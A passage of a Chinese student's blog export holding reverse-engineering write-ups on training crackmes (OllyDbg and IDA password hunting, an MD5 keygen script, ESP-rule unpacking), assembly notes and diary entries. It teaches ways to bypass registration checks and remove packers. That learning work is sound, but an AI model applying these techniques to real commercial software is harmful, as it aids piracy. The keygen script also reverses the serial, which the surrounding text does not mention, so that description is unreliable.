View）中按下G键，输入00401E5C，就会自动跳转到计算MD5的函数代码中，如图所示：从这里并不能得到什么有用的信息，我们需要通过不断的回溯来理解程序的代码逻辑。通过往上查阅代码，我们知道00401E5C 位于函数sub_401D10之中，我们对sub_401D10进行交叉引用查找，如图所示：可以从sub_401D10回溯到sub_4026F0，继续通过交叉引用往上回溯，依次为sub_4027B0、sub_401C00、sub_401BB0、sub_401510，而sub_401510就是我们在实验步骤一种为一个暂时不理解的函数。那么我们可以猜测sub_401510这个函数就是用来计算用户名的MD5值的，我们可以通过OD动态调试来验证我们的想法。通过阅读IDA中的反汇编代码，我们知道在00401752处调用了sub_401510这个函数现在OD载入CrackMe4.exe程序，在00401752处设置一个断点，然后按F9运行程序，用户名输入test，密码输入一个32个字符的任意字符串，单击“注册”按钮，程序便会自动断下，断下后按F8进行单步跟踪，执行sub_401510这个函数后，我们看到eax寄存器的值为098F6BCD4621D373CADE4E832627B4F6，这个恰好就是test的MD5值。 编写注册机现在我们已经将程序的注册算法分析清楚了，下面就可以编写一个注册机了。程序的注册算法为：将用户名进行MD5计算得到一个哈希值，将哈希值转换为大写字符串即可，其中用户名的长度在1~10之间，不能超过10.Python内置了MD5算法，可以非常方便的计算MD5值，我们编写这样一段脚本即可： import hashlib while True: username = raw_input(&quot;input username:&quot;) md5 = hashlib.md5(username).hexdigest().upper() serial = md5[::-1] # 翻转字符串 print &quot;serial: %s&quot; % serial 我们输入用户名Wins0n，就可以得到注册码为51F561458ADAEEBA43A57CF7E59F6CC4，输入程序可以成功注册，如图所示： “抄”完的我快难受死了….","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"合天 CTF-REVERSE练习之API断点 WP","slug":"合天-CTF-REVERSE练习之API断点-WP","date":"2017-08-12T06:28:27.000Z","updated":"2018-07-30T13:04:01.409Z","comments":true,"path":"2017/08/12/合天-CTF-REVERSE练习之API断点-WP/","link":"","permalink":"http://leo.dropsec.xyz/2017/08/12/合天-CTF-REVERSE练习之API断点-WP/","excerpt":"通过OD的API参考断点以及IDA中针对API的交叉引用查找功能，可以快速定位到调用特定API的位置。但通过API动态调用技术，可以有效对抗这种逆向分析方法。本实验通过对API直接设置断点以及利用MessageBox的阻塞特性，介绍了针对API动态调用的逆向分析方法。","text":"通过OD的API参考断点以及IDA中针对API的交叉引用查找功能，可以快速定位到调用特定API的位置。但通过API动态调用技术，可以有效对抗这种逆向分析方法。本实验通过对API直接设置断点以及利用MessageBox的阻塞特性，介绍了针对API动态调用的逆向分析方法。这个程序基本上和前两个是一样的马甲，但是如果你尝试用之前的方法来找到密码，是很难行的通的。so,我们来学习新东西… 一：利用API断点跟踪关键函数代码该程序外形和之前的一样，这里不再赘述，直接OD载入，Ctrl+G,在窗口中输入MessageBoxA,确定,来到MessageBoxA的调用点，F2下断点F9运行，在弹出窗口输入test，确定。程序在MessageBoxA的第一条指令断下，点击菜单栏调试-&gt;执行到用户代码，这时候CrackMe的错误提示消息框将会弹出来，我们点击消息框的“确定”按钮，程序在OD中会再次断下。这次是因为点击了“执行到用户代码”的原因，OD会在调用了MessageBoxA的下一条指令自动断下，如图所示：可以知道004015F6处的call就是调用了MessageBoxA函数F8单步跟踪，消息框中出现字符串，它就是我们想要的密码…………………………………………………… 在上面步骤中，我们在MessageBoxA断下后，通过“执行到用户代码”回到CrackMe空间的代码，通过简单的F8单步跟踪，就很幸运的看到了过关密码。然而在实际调试过程中，可能需要跟踪很久才能发现一点蛛丝马迹，那么我们可以结合IDA的静态分析功能来加速我们的逆向过程。在前面的分析中，我们知道在004015F6这个地址调用了MessageBoxA函数，现在使用IDA载入CrackMe3.exe，待分析结束后按下G，然后输入“004015F6”后点击OK按钮，就会自动跳转到004015F6这个地方了，如图所示：F5查看伪代码，很容易发现密码 实际逆向过程中，要学会OD与IDA熟练结合使用。扬长避短。 …………………………………………………… 二：利用MessageBox的阻塞特性定位关键代码我们知道MessageBox是一个阻塞的API，就是当调用这个API的时候，会弹出一个消息框，此时程序的代码执行流就会自动阻塞在调用MessageBox的地方，直到点击提示框上的按钮或者关闭提示框时，程序才会继续往下执行。那么在程序弹出MessageBox的时候，我们可以在OD中让程序断下来，然后通过“执行到用户代码”来回到调用MessageBox的地方，这就是说MessageBox本身就类似于“断点”。使用OD载入CrackMe3.exe，如果之前设置了断点，为了防止干扰，我们需要先清除掉之前设置的断点。F9运行程序，在窗口输入test，点击确定，出现错误提示窗口，不要点击确定。F12暂停程序。选择菜单调试-&gt;执行到用户代码。错误提示窗口点击确定，程序在OD中会再次断下。这次是因为点击了“执行到用户代码”的原因，OD会在调用了MessageBoxA的下一条指令自动断下，如图所示然后你突然就懂了…(F8。。。)","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"合天 CTF REVERSE练习之API定位 WP","slug":"合天-CTF-REVERSE练习之API定位-WP","date":"2017-08-11T08:56:14.000Z","updated":"2018-07-30T13:03:34.018Z","comments":true,"path":"2017/08/11/合天-CTF-REVERSE练习之API定位-WP/","link":"","permalink":"http://leo.dropsec.xyz/2017/08/11/合天-CTF-REVERSE练习之API定位-WP/","excerpt":"通过字符串引用查找来定位关键函数代码是一种常用的简单有效的分析方法，而在字符串经过处理时，这种方法就失效了，本实验将介绍一种新的分析方法：通过关键API交叉引用查找以及通过对关键API下断点来定位关键函数的代码。","text":"通过字符串引用查找来定位关键函数代码是一种常用的简单有效的分析方法，而在字符串经过处理时，这种方法就失效了，本实验将介绍一种新的分析方法：通过关键API交叉引用查找以及通过对关键API下断点来定位关键函数的代码。一样，先用PEID查看程序是否加壳，发现没壳。然后观察程序，发现貌似和第一题一样加载进OD，不妨按照第一题的思路那样查找字符串，发现找不到这是因为字符串是通过LoadString加载的，OD无法通过字符串查找的方法来定位资源中定义的字符串条目。so，只能开辟新的途径喽…右键反汇编窗口选择查找-&gt;当前模块中的名称（标签），在跳出的窗口中直接输入messageboxa,右键这条语句，窗口中选择“在每个参考上设置断点”，在OD最下方的状态栏上会看到“已设置 2 个断点”的提示。F9运行，弹出窗口输入test，确定，暂停到对messageboxa调用的地方然后，查看其附近的代码，发现上方出现了密码。…………………………………………………………..接下来用IDA实现，载入程序，点击Imports TAB页面，直接输入messageboxa，双击这条语句，来到messageboxa定义的位置，选中messageboxa后按X键，弹出交叉引用列表窗口，共有四条我们并不能直接看出哪一个引用就是我们所要找的引用，所以需要一个一个进行查看（根据前面使用OD对程序的分析，我们知道在MessageBoxA之前有许多对LoadString的调用，因此通过对比几个交叉引用，可以断定sub_401450就是我们要找的函数）使用F5还原sub_401450函数的伪代码，伪代码如下：我们断定LoadString加载资源ID为0x6A的字符串就是我们要找的密码，现在使用Restorator打开CrackMe2.exe程序来查看字符串资源，如图所示，0x6A的十进制即106，因此可以知道密码就是HeeTianLab了。 额外补充： IDA的交叉引用功能能针对系统API，也能对自定义函数发挥作用 即使对字符串做加密处理也不能阻止通过API来定位关键函数代码 IDA也无法通过Strings Window来查看资源中定义的字符串条目","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"合天 CTF-REVERSE练习之逆向初探 WP","slug":"合天-CTF-REVERSE练习之逆向初探-WP","date":"2017-08-11T06:31:26.000Z","updated":"2018-07-30T13:05:37.752Z","comments":true,"path":"2017/08/11/合天-CTF-REVERSE练习之逆向初探-WP/","link":"","permalink":"http://leo.dropsec.xyz/2017/08/11/合天-CTF-REVERSE练习之逆向初探-WP/","excerpt":"暑假任务书上让做实验吧上的实验，并且需要写下WP，那我就听话写一写呗…","text":"暑假任务书上让做实验吧上的实验，并且需要写下WP，那我就听话写一写呗…拿到题目先观察，是这个样子的：不输入密码点确定是这个样子的：随便输入一个密码(比如test)是这个样子的“然后开始逆向，先用PEID查看 是否带壳：发现没有带壳，然后选择OD或IDA进行逆向分析，这里先用OD查看，载入程序，右键选择智能查找字符串-&gt;ASCII,出现字符串窗口Ctrl+f查找关键字，如密码错误找到关键字符双击进入对应反汇编窗口发现关键字上边有一个明显的jnz向错误提示跳转，它就是关键跳转，NOP掉就可以实现爆破了。这里我们来寻找注册码。从jnz往上看代码，会发现有部分风格完全变的不一样，就在这里下个断点重新载入程序，F9，在弹出的窗口中输入test，F8单步运行，运行到00401490出时在信息窗口中出现输入的错误密码test，及HeeTianLab猜测HeeTianLab就是正确的密码，结合附近上下的代码分析，此处在拿输入的密码和正确的进行一一比较，不一样则跳转到错误语句。把HeeTianLab输入到另外一个新程序中,密码正确。………………………………………………….也可以用IDA进行分析，载入程序，shift+F12，查找关键字符串，双击进入，选中对应字符串，按X进行交叉引用查找，来到引用字符串的地方F5查看伪代码，发现就是那输入字符串与HeeTianLab进行比较。故得到正确密码。 注意：按F5查看伪代码，有时候会发现界面没反应，原因有可能是没有选对正确位数的IDA。","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"壳与ESP定律","slug":"壳与ESP定律","date":"2017-08-10T12:58:45.000Z","updated":"2018-07-30T13:01:32.085Z","comments":true,"path":"2017/08/10/壳与ESP定律/","link":"","permalink":"http://leo.dropsec.xyz/2017/08/10/壳与ESP定律/","excerpt":"好不容易略懂了一点ESP…","text":"好不容易略懂了一点ESP… 一：知识准备 通过前面的学习，学会了利用暴力破解达到绕过注册机制和追踪注册码来达到“合法”用软件的方法，但是我们往往会遇到代码经过混淆器混淆的程序，此类混淆器可以称之为壳，壳又可分为压缩壳（常见的有UPX、北斗、ASDPack、Npack、PECompact等）和保护壳（如强壳Safengine、VMprotect、winlicense、Themida等），压缩壳作用是把程序进行体积缩小化处理，保护壳主要作用是混淆或加密代码防止他人进行逆向程序、破解程序。我们可以通过一些侦壳程序进行识别，但有些壳会采用伪装技术来混淆侦壳程序。 ESP定律的原理：堆栈平衡原理。ESP定律是堆栈平衡原理在实践中的一个应用。所谓堆栈平衡原理，即加壳程序运行时，需要先保存原程序的初始现场，将现场状态压入堆栈，待壳运行完毕后，将原程序的现场状态出栈，此时开始运行原程序。在具体应用时，通过记录堆栈寄存器存储原程序初始现场状态的地址，并使程序在为将初始状态出栈而访问以记录的地址时中断，程序中断处便在OEP附近。 ESP定律的适用范围是什么？几乎全部的压缩壳，部分加密壳。只要是在JMP到OEP后，ESP=0012FFC4的壳，理论上我们都可以使用。但是在何时下断点避开校验，何时下断OD才能断下来，这还需要多多总结和多多积累。ESP定律法的步骤ESP定理脱壳（ESP在OD的寄存器中，我们只要在命令行下ESP的硬件访问断点，就会一下来到程序的OEP了！）（1）开始就点F8，注意观察OD右上角的寄存器中ESP有没突现（变成红色）（这只是一般情况下，更确切的说我们选择的ESP值是关键句之后的第一个ESP值）当有且只有ESP和EIP为红色时，我们可以用ESP定律了（2）在命令行下：dd XXXXXXXX(指在当前代码中的ESP地址，或者是hr XXXXXXXX)，按回车（3）选中下断的地址，断点—&gt;硬件访问—&gt;WORD断点（4）按一下F9运行程序，直接来到了跳转处，按下F8，到达程序OEP二：实战操作1.查壳用PEID查壳结果如下：2.寻找OEP(1)OD载入程序(2).按F8，发现只有ESP、EIP是红色。记下此时ESP的值0019FF64（每个人机器上运行这个值有可能不同）(3).在Command命令行中输入dd 0019FF64,回车(4).选中要下断点的0019FF64那一行，右键，依次选择断点 -&gt; 硬件访问 -&gt; Word(5).在菜单栏调试（D）下的硬件断点（H）下选项下可以看到我们设置的硬件断点,确定。(6).然后按一下F9运行程序，如下：(7).运用F8很快会到达程序的OEP(8).然后我们就可以脱壳了，脱壳前我们先把断点清理掉，以免出错【调试→硬件断点→删除】3.脱壳（使用OD自带插件）右击程序当前位置第一行代码，选择OllyDump脱壳调试进程,然后我们在弹出的窗口中选择脱壳，然后输入要另存为的文件名此时，我们已经脱壳结束，检查下程序能否正常运行,再看下PEID对比脱壳前和脱壳后的不同.到此，脱壳就完成了。 小小总结文中用到的加壳程序下载地址：http://download.csdn.net/detail/qiurisuixiang/4363770 参考链接1：http://blog.csdn.net/qiurisuixiang/article/details/7649799参考链接2：http://www.cnblogs.com/ichunqiu/p/6213852.html参考链接3：http://www.52pojie.cn/thread-236872-1-1.html","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"十天的放逐","slug":"十天的放逐","date":"2017-08-08T02:59:26.000Z","updated":"2018-07-30T13:00:56.713Z","comments":true,"path":"2017/08/08/十天的放逐/","link":"","permalink":"http://leo.dropsec.xyz/2017/08/08/十天的放逐/","excerpt":"就是这样如此巧合 2017.8.7 返校 立秋我已经进入了秋天","text":"就是这样如此巧合 2017.8.7 返校 立秋我已经进入了秋天7.27–8.7 整整在家呆了十天上大学以来 这是第三次回家自小到大 跟大部分同龄人相比回家好像对于我来说好像没有特别大的诱惑力 小学一个月回一次家高中几个星期回一次家到现在可能一年回几次家都是如此我不会像其他人那样焦急地去等待 该回家的时候拎起书包回家不该回家回家的时候不去过多的想念这好像就是我回家的一贯原则因此 不止一个人曾称呼我为野孩子哈哈哈。。。 十天的前几天回老家看望爷爷其他时间都在县城里和一部分好友聚了聚骑车在熟悉的县城里逛了逛其他时间也就那样什么也没干 让我感到惭愧的是我没能正真的、深层次的去理解自己的父母与家庭几天之中还是把自己最坏的脾气展示给了最亲的人 对于我来说每回一次家都是对自己精神的一次洗礼让我重新认识自己其中，我的亲人是主要的讲师 ………………………………….暑假还剩不到一个月其中大约有五天计划和朋友去趟天津剩下大约二十天对我来说是一个黄金时间也应该是我暑假浓墨重彩的一笔简单立个Flag: 每天至少上传一个自己感觉有价值的逆向题目WP。最后至少需要有二十个题解。 抽时间学习一下Py,能写出简单的脚本。 多看别人的博客，学习新东西。 追随逐梦者的脚步","categories":[],"tags":[{"name":"洋流","slug":"洋流","permalink":"http://leo.dropsec.xyz/tags/洋流/"}]},{"title":"暑假一练 WriteUp","slug":"暑假一练-WriteUp","date":"2017-07-20T07:36:24.000Z","updated":"2018-07-30T13:00:08.105Z","comments":true,"path":"2017/07/20/暑假一练-WriteUp/","link":"","permalink":"http://leo.dropsec.xyz/2017/07/20/暑假一练-WriteUp/","excerpt":"也算是第一次正式的接触这种题目吧，在聪大佬的指引下大概领悟了点，咱也写一些WriteUp…","text":"也算是第一次正式的接触这种题目吧，在聪大佬的指引下大概领悟了点，咱也写一些WriteUp… 第一题 Hellow 分值:50题目下载链接 首先运行一下程序，看看是什么样子： 可知本题应该是输入用户名、注册码之类。然后将程序加载进IDA，shift+F12查询程序中的关键字符串 在前几行会看到有我们需要找到字符串，选择程序开始的提示“Please input your name”双击进入。 这个界面是数据段，选中对应语句，按ctrl+x出现一个弹框，选择对应语句并OK 按F5尝试得到伪代码发现不行 按空格键结合流程图大致看看程序的思路，再回到主界面根据白色提示信息，往下浏览代码，发现在输入name之后有聚集的cmp比较语句，在输入password后也有聚集的cmp比较语句 再结合验证机制，可以确定这部分语句就是核心所在。然后依次把比较语句中的十六进制数字选中按“R”键转换成对应字符。便可得到用户名与注册码 注意：1.不要漏字符 2.留意字符是否存在顺序 3.看清楚0和O和o最后用户名是：Syclover 注册码是：Hell0_W0rld 第二题 注册码 分值:100题目下载链接 依然是先运行程序 可知此题与第一题有些相似，均为求注册码类型的题目。但是考察的内容可能略有不同，毕竟分值大了，也就是说难了，或者说需要略有思考或者计算才能解决。不管那么多，先拖进IDA再说。按照第一题的步骤一步步来，当按下shift+F12后感觉目的字符串不好找的话可以按ctrl+f查找关键字符串。比如此题可以用“name”作为关键字来查找。 找到之后双击进入，选中，ctrl+x进入调用段，F5查看伪代码 仔细分析算法，依次算出V7便是答案。最后注册码为：Ygspiqcb (聪哥之前写的脚本…) 第三题 R_KEY 分值:200题目下载链接 &lt;敬请期待&gt;","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"汇编语言 王爽 章节知识点总结","slug":"汇编语言 王爽 章节知识点总结","date":"2017-07-15T12:04:11.000Z","updated":"2018-07-30T12:59:09.337Z","comments":true,"path":"2017/07/15/汇编语言 王爽 章节知识点总结/","link":"","permalink":"http://leo.dropsec.xyz/2017/07/15/汇编语言 王爽 章节知识点总结/","excerpt":"王爽老师的书差不多看了一半，听很多人说这位老师的书写的很不错，为了看完之后不至于很容易的忘记，故结合前人笔记草草回顾一遍…","text":"王爽老师的书差不多看了一半，听很多人说这位老师的书写的很不错，为了看完之后不至于很容易的忘记，故结合前人笔记草草回顾一遍… 第一章 基础知识1.存储单元为1Byte，即字节。微小信息单位为1bit，其中1Byte=8bit。（一个存储单元可以存储8个bit，即8位二进制数。） 1GB=1024MB 1MB=1024KB 1KB=1024B 1B=8bit2.存储单元从零开始顺序编号。 第二章 寄存器3.8086CPU有14个寄存器，AX(accumulate) BX(base) CX(count) DX(data) SI DI指针寄存器：SP BP IP段寄存器：CS SS DS ES标志寄存器：PSW4.AX可分为AH(高8位）和AL(低8位)，均可以当做独立寄存器使用，互不影响。5.对于实验中溢出的数据，由PSW寄存器保存溢出值。6.8086CPU采用段地址和偏移地址，通过地址加法器来合成物理地址物理地址=段地址x 16 + 偏移地址（段的大小=偏移地址的长度）7.偏移地址16位，其变化范围为0—FFFFH；仅用偏移地址来寻址最多可寻64KB个内存单元。 第三章 寄存器（内存访问）8.字单元：存放一个字型数据（16位）的内存单元，由两个地址连续的内存单元，将起始地址为N的字单元简称为N地址字单元。9.8086CPU不支持数据直接入段寄存器10.栈：LIFO（后进先出） 8086CPU入栈（PUSH）和出栈（POP）以字为单位；11.SS：SP 任意时刻始终指向栈顶元素，PUSH AX由下面两步构成：（1）SP=SP-2，SS：SP指向当前栈顶前面的单元，以当前栈顶前面的单元作为新的栈顶；（2）将AX中的内容送入SS：SP指向的内存单元处，SS：SP此时指向新栈顶. （栈顶指针指向的元素最终都是有效的）12.8086CPU入栈时，栈顶从高地址向低地址方向移动，栈为空的时候，SS：SP指向最底部的字单元的偏移地址+2。13.出栈后，SS：SP指向新的栈顶，但之间栈顶的元素还在，只是不在栈中，在之后PUSH移动至此后，此数据将会被覆盖。 第4章 第一个程序14.一个汇编程序由多个段组成，这些段分别用来存放代码，数据，后者当做栈空间，一个有意义的汇编程序中至少有一个段，这个段用来存放代码。 第5章 【bx】和loop指令15.① 【 】表示偏移地址，也表示一个内存单元 ②（ ）表示“一个寄存器或一个内存单元中的内容” ③ Idata表示常量16.Loop指令的格式：loop 标号①（CX）＝（CX）- 1；②（CX）≠0，则转至标号处循环执行（CX）＝0，则继续向下执行 第7章 更灵活的定位内存地址的方法17.在汇编程序中，数据不能以字母开头(+0)18.伪指令：dw 定义字型数据；db 定义字节型数据；dd 定义双字型数据19.Si和Di不能够分成两个8位寄存器，功能和BX相近。20.大小写的转化方法：and al，11011111 b（大写）or al，00100000 b (小写) 第8章 数据处理的两个基本问题21.Reg（寄存器）：AX，BX，CX，DX（及其8位高低寄存器），SP，BP，Si, DiSreg（段寄存器）：DS，SS，CS，ES8086CPU只有BX，Si，Di, BP可以用【】来进行内存单元寻址，可以单独出现，或BXBX BPBP SiDi SiDi 组合出现22.在【】中使用BP，如果指令没有显性给出段地址，默认在SS中23.指令在执行前，所要处理的数据可以在3个地方：CPU内部，内存，端口24.div指令（除法指令）8位除数 16位除数16位被除数 32位被除数{ AX （低16位）DX（高16位）}AL（商）AH（余数） AX（商）DX（余数）25.伪指令dupdb/dw/dd 重复次数 dup（重复的字节/字型/双字型）dw 0, 0, 0, 0, 0, 0 ,0, 0 = dw 8 dup（0） 第9章 转移指令的原理26.转移指令：可以修改IP，或同时修改CS和IP的指令。8086CPU的转移行为：段间转移（修改CS：IP）段内转移（只修改IP）短转移：IP修改范围-128—127 近转移：IP修改范围 -32768—3276727.offset 取得标号处的偏移地址nop 空指令（占位置/用于程序对齐/设标号/延时）28.jmp指令 依据位移转移的jmp指令（CPU在执行jmp指令的时候不要需要转移的目的地址）jmp short 标号 段内短转移 功能：IP=IP+8位位移（标号处地址-jmp指令后第一个字节地址）jmp near ptr 标号 段内近转移 功能：IP=IP+16位位移 转移的目的地址在指令中的jmp指令jmp far ptr 标号 段间转移 功能：CS=标号所在段的段地址，IP=标号在段中的偏移地址 转移地址在寄存器中的jmp指令jmp 16位reg 功能：IP=（16位reg） 转移地址在内存中的jmp指令Jmp word ptr 内存单元地址（段内转移）功能：转移的偏移地址是内存单元中的内容Jmp dword ptr 内存单元地址（段间转移）功能：内存单元中的高地址处为转移的段 地址，低地址处是转移的目的偏移地址29.jcxz指令jcxz 标号 功能：相当于if(（cx）==0）jmp short 标号30.loop指令loop 标号 功能：相当于（cx）– ； if（（cx）!=0）jmp short 标号 第10章 CAll和RET指令31.call指令（和jmp指令进行比较） 依据位移转移的call指令（CPU在执行call指令的时候不要需要转移的目的地址）call 标号 相当于push IP /jmp near ptr 标号； 转移的目的地址在指令中的call指令call far ptr 标号 相当于push CS / push IP / jmp far ptr 标号 转移目的地址在寄存器中的call指令call 16位reg 相当于push IP / jmp 16位reg； 转移地址在内存中的call指令call word ptr 内存单元地址 相当于push IP / jmp word ptr 内存单元地址；call dword ptr 内存单元地址 相当于push CS / push IP /jmp dword ptr 标号32.ret和retf指令ret指令用栈中的数据，修改IP的内容，从而实现近转移，相当于pop IP；retf指令用栈中的数据，修改CS和IP中的内容，从而实现远转移；相当于pop IP/pop CS33.mul指令格式：mul reg 或者mul 内存单元；结果：8位乘法，结果放在AX中，16位乘法，则高位放在DX中，低位放在AX中 第11章 标志寄存器34.8086CPU的flag寄存器的结构35.adc指令（带进位的加法指令）格式：adc 操作对象1 操作对象2功能：操作对象1=操作对象1 + 操作对象2 + CF36.sbb指令（带借位的减法指令）格式：sbb 操作对象1 操作对象2功能：操作对象1=操作对象1 - 操作对象2 - CF37.cmp指令 （比较指令，不保存结果，影响相关标志位的值）格式：cmp 操作对象1 操作对象2功能： 操作对象1 - 操作对象238.检验比较结果的条件转移指令 （e:equal ；a:above ；b:below；）39.rep movsb相当于： s:movsb loop s rep的作用是根据CX的值，重复执行后面的穿传送指令。由于每执行一次movsb指令si和di都会递增或递减指向后一个单元或前一个单元，则rep movsb就可以循环实现(CX)个字符的传送。执行movsb相当于进行以下几步操作： ((es)16+(di))=((ds)16+(si)) 如果df=0 则si=si+1 di=di+1如果df=1 则si=si-1 di=di-1 40.cld 将标志寄存器的DF置0，正向std 将标志寄存器的DF置1，逆向pushf 将标志寄存器入栈popf 将标志寄存器出栈 第12章 内中断41.内中断就是CPU不再处理执行中的指令，而是转去处理这个特殊的信息 内中断的产生包括以下几个：除法错误（div指令产生的除法溢出） 中断类型码：0单步执行 中断类型码：1执行into指令 中断类型码：4执行int指令 中断类型码：n （int n） 42.关于中断过程CPU收到中断信息—生成中断类型码—查找中断向量表—找到中断处理程序入口（设置段地址和偏移地址）对于8086CPU，中断向量表存在于内存0000:0000—0000:03FF的1024个单元中，由于其中有一些空白的地方，所以我们一般将自己编写的中断程序放在0000:0020—0000:02FF的256个字节空间里。PC机的中断例程是由CPU硬件完成，在接受到中断信息后，会执行一下操作：① 产生中断类型码② 标志寄存器的值入栈（pushf）③ 设置标志寄存器中的IF和TF的值为0（原因在书P250和P273）④ CS内容入栈 （push CS）⑤ IP内容入栈 （push IP）⑥ IP=中断类型码4 （N4）⑦ CS=中断类型码4+2 （N4+2）43.编写中断处理程序的步骤① 保存用到的寄存器② 处理中断③ 恢复用到的寄存器④ 用iret指令返回44.Iret指令的功能用汇编语言描述为： POP IPPOP CSpopf 第13章 int指令45.int指令引发的中断（int n）过程：1.取得中断类型码n2.标志寄存器入栈，IF，TF设置为03.CS，IP入栈4.（IP）=（n 4），（CS）=（n 4 + 2） 46.BIOS中主要包含的内容 硬件系统的检测和初始化程序外部中断和内部中断的中断例程用于对硬件设备进行的I/O操作的中断例程其他和硬件系统相关的中断例程 第14章 端口47.shl（左移）和shr（右移）指令将一个寄存器或内存单元中的数据向左（向右）移位将最后移出的一位写入CF中最低位（最高位）用0补充 第15章 外中断48.外中断：对外部设备进行控制外放的输入—相关接口芯片的端口—CPU内存…………………………………………………….. 指令系统总结 8086CPU 提供以下几大类指令：1、数据传送指令比如：mov、push、pop、pushf、popf、xchg等都是数据传送指令，这些指令实现寄存器和内存、寄存器和寄存器之间的单个数据传送。2、算术运算指令比如：add、sub、adc、sbb、inc、dec、cmp、imul、idiv、aaa等都是算术运算指令，这些指令实现寄存器和内存中的数据的算数运算。它们的执行结果影响标志寄存器的：sf、zf、of、cf、pf、af位。3、逻辑指令比如：and、or、not、xor、test、shl、shr、sal、sar、rol、ror、rcl、rcr 等都是逻辑指令。除了not指令外，它们的执行结果都影响标志寄存器的相关标志位。4、转移指令可以修改IP ，或同时修改CS 和IP 的指令统称为转移指令。转移指令分为以下几类：（1）无条件转移指令，比如：jmp；（2）条件转移指令，比如：jcxz、je、jb、ja、jnb、jna等；（3）循环指令，比如：loop；（4）过程，比如：call、ret、retf；（5）中断，比如int、iret。5、处理机控制指令这些指令对标志寄存器或其他处理机状态进行设置，比如：cld、std、cli、sti、nop、clc、cmc、stc、hlt、wait、esc、lock等都是处理机控制指令。6、串处理指令这些指令对内存中的批量数据进行处理比如：movsb、movsw、cmps、scas、lods、stos等。若要使用这些指令方便地进行批量数据的处理，则需要和rep、repe、repne等前缀指令配合使用。 end","categories":[],"tags":[{"name":"笔记","slug":"笔记","permalink":"http://leo.dropsec.xyz/tags/笔记/"}]},{"title":"Summer  第一周","slug":"Summer-第一周","date":"2017-07-11T09:07:40.000Z","updated":"2018-07-30T12:58:29.610Z","comments":true,"path":"2017/07/11/Summer-第一周/","link":"","permalink":"http://leo.dropsec.xyz/2017/07/11/Summer-第一周/","excerpt":"留校第一周的学习周报","text":"留校第一周的学习周报 本周做了哪些学习记录？请分享你做的笔记、博客7.1–7.71.刘爽老师的《汇编语言》看到了第五章。了解了汇编语言的一些基础知识，比如汇编语言的产生、存储器、总线、主板等基本概念。以及寄存器是什么，有哪几种寄存器，不同寄存器的特定作用，怎么读写寄存器，和一些修改寄存器的指令，包括：mov、add、sub、jmp以及栈操作的指令push、pop。还有就是“段”在内存中的概念。 2.搭建了一个自己的博客。用了大约2天的时间，终于搭建好了自己的博客空间，以后自己学到的感觉有趣的知识以及自己的心得感悟都会实时更新到上面，一来是记录，二来是分享。附博客链接[http://leo.dropsec.xyz/] 3.这几天还做了一个事情就是帮助了一位小学妹报志愿。又经历了一次报志愿，其中选择学校时的犹豫、面对高录取分的无奈、未来握在自己手中时的不安。。。有一次经历、又一次感悟。骚年，努力学习吧。 下周的学习目标是什么？1.感觉自己现在还没有真正走进汇编，接下来的几天主要任务就是继续研读汇编，同时多熟悉OD、IDA等相关软件的使用，能读懂汇编语言写的程序。 2.接下来的学习肯定少不了学姐学长在方向上的引领和问题方面的解答，感谢学长学姐。最后一起努力。","categories":[],"tags":[{"name":"洋流","slug":"洋流","permalink":"http://leo.dropsec.xyz/tags/洋流/"}]},{"title":"年少无为，卖马为生","slug":"年少无为，卖马为生","date":"2017-07-08T12:48:06.000Z","updated":"2018-07-30T12:52:24.500Z","comments":true,"path":"2017/07/08/年少无为，卖马为生/","link":"","permalink":"http://leo.dropsec.xyz/2017/07/08/年少无为，卖马为生/","excerpt":"前几天在浏览博客的时候无意间看到有人用“年少无为，卖马为生”来介绍自己，顿时心里五味陈杂…","text":"前几天在浏览博客的时候无意间看到有人用“年少无为，卖马为生”来介绍自己，顿时心里五味陈杂…我自认为我也算是一个有故事的人经历的缘故，在别人眼中我是一个沉稳、严肃、不怎么爱说话的大男孩大一这一年，对我来说无疑是一个有纪念意义的一年 那天刚好是我的生日，独自一人踏上了外地求学的旅程，临走之前我这样都自己说： 新的开始总要拿些新的东西去面对，“勇敢做自己，开拓XX滩。”是我送给每位即将远行好友的一句话，现在亦讲给自己。高考前100天曾这样写过：只知道彼时的我不会大喜也不会大悲，只是怀一颗平静、明朗的心接受自己努力学习的结果，继而换上行装、双手插兜、面带笑容走向远方…… 2016.9.7 踏进北门的那一刻，四年的大学生活就这样拉开了帷幕紧接着竞选了军训负责人并顺利的当选班长我的记忆只存在几秒如果说大一有记忆的话那么班长工作基本就是全部 必须承认这一年在学习上我是没怎么用心的没有长时间投入的做一件事情因此，有些时候会有一种滑稽可笑的想法感觉大一一年什么也没学到哈哈，这不是真的（严肃脸）‘非时’说：你至少学会怎么跟陌生人相处虽然她是一个“奇怪”的人 寒假是我大一生活中浓墨重彩的一笔和几个可以说是陌生人的陌生人去广州打工美资企业 Jabil十个白天九个黑夜自我感觉也没真正的吃到苦除夕前一天晚上游荡在广州塔下其间去了一趟深圳在大梅沙触摸到了沙滩和大海然后穿过亚热带到达了温带重新回到了我喜欢的冬天记忆特别清晰下火车后我内心一阵窃喜同时身体也在发抖…总之第一次远程，整体感觉不错喜欢上了那里一景一物给我带来的特有感觉聆听了我娜姐的故事 娜姐，今晚你给我讲你的故事，几年后，我会找到你给你讲我的故事，到时候请认真听。娜姐，勇敢追寻你的幸福吧，你幸福我便会幸福。2017.2.14 现在我的记忆还停留在寒假结束拉着行李箱走进学校谁会料到转眼之间暑假已经来到 这便是我的大一记忆不多却愈发珍贵 大一的暑假我选择了留校跟着实验室的学长学姐学点东西希望接下来的一年里自己可以静下心、低下头掌握一些真本领做一个技术控、IT男 最后简单整理一下这一年来零碎写下的便签 